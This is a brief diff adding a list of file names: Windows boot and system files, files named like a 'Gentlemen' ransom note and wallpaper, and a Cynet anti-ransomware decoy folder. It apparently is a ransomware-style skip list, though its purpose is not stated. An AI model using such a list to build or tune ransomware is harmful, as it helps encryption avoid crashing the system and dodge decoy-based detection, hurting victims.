@@ -1,0 +1,19 @@
+boot.ini
+desktop.ini
+autorun.ini
+autorun.inf
+ntuser.dat
+ntuser.ini
+thumbs.db
+ntldr
+bootmgr
+bootmgr.efi
+bootmgfw.efi
+bootsect.bak
+bootfont.bin
+pagefile.sys
+hiberfil.sys
+iconcache.db
+README-GENTLEMEN.txt
+gentlemen.bmp
+! Cynet Ransom Protection(DON'T DELETE)
